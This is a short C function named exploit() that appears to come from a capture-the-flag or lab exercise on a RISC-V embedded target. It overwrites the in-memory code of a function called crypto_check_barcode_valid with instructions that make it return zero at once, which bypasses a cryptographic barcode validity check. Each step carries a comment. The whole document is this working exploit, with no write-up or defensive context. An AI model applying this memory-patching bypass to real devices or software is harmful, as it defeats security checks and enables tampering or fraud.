void exploit() {
    // write to the address of crypto_check_barcode_valid
    int *x = (int *)0xc0026f3c;
    // this is the "load 0 into a0" instruction
    x[0] = 0x00000513;
    // this is the "ret" instruction
    x[1] = 0x00008067;
}